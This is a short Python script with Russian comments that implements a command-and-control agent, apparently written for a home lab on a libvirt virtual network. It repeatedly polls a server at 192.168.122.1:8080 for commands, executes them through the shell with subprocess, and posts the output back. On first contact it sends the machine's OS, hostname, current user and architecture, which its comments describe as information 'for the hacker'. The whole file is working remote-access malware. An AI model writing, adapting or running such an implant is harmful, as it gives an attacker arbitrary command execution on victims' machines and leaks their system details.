import time
import requests
import subprocess
import platform
import os

# Твой IP виртуального моста libvirt
URL = "http://192.168.122.1:8080"

def get_system_info():
    """Собирает базовую информацию о системе для отправки хакеру"""
    try:
        info = (
            f"[!] Новый агент на связи!\n"
            f"ОС: {platform.system()} {platform.release()}\n"
            f"Имя машины: {platform.node()}\n"
            f"Текущий юзер: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}\n"
            f"Архитектура: {platform.architecture()[0]}\n"
        )
        return info
    except Exception as e:
        return f"[!] Не удалось собрать инфу о системе: {e}\n"

print("[*] Агент запущен и пытается связаться с C2 сервером...")

# При первом запуске отправляем метаданные системы вместо whoami
first_run = True

while True:
    try:
        # 1. Спрашиваем команду у сервера
        response = requests.get(f"{URL}/get_command", timeout=5)
        if response.status_code == 200:
            data = response.json()
            command = data.get("command", "wait")
            
            if command == "exit":
                print("[*] Получена команда на выход. Завершение.")
                break
                
            # Если это первый коннект, игнорируем "wait" и отправляем инфу о системе
            if first_run:
                payload = {"result": get_system_info()}
                requests.post(f"{URL}/send_result", json=payload, timeout=5)
                first_run = False
                continue
            
            # Выполнение обычных команд от сервера
            if command != "wait":
                print(f"[+] Выполняю команду: {command}")
                sub = subprocess.run(command, shell=True, capture_output=True, text=True)
                output = sub.stdout if sub.stdout else sub.stderr
                if not output:
                    output = "[Успешно выполнено, но команда ничего не вернула]"
                
                payload = {"result": output}
                requests.post(f"{URL}/send_result", json=payload, timeout=5)
                
    except requests.exceptions.ConnectionError:
        pass
        
    time.sleep(3)
